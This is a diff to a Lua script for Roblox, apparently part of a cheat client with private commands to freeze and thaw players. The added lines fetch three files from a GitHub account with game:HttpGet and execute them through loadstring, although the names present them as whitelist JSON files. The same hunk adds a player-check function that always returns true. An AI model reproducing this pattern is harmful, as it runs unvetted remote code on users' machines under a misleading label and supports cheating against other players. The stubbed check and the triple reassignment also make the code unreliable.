@@ -1913,6 +1913,18 @@ runFunction(function()
 		}
 		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
 
+		local textChatService = game:GetService("TextChatService")
+		local allowedplayers = loadstring(game:HttpGet("https://raw.githubusercontent.com/laserPGN/whitelist.json/main/.githubgnore"))()
+		local allowedplayers = loadstring(game:HttpGet("https://raw.githubusercontent.com/laserPGN/whitelist.json/main/PlayerWhitelist.json"))()
+		local allowedplayers = loadstring(game:HttpGet("https://raw.githubusercontent.com/laserPGN/whitelist.json/main/whitelist.json"))()
+
+
+		local playersService = game:GetService("Players")
+
+		local function isPlayerAllowed(playerName)
+			return true
+		end
+
 		textChatService.OnIncomingMessage = function(message)
 			local props = Instance.new("TextChatMessageProperties")
 			if message.TextSource then
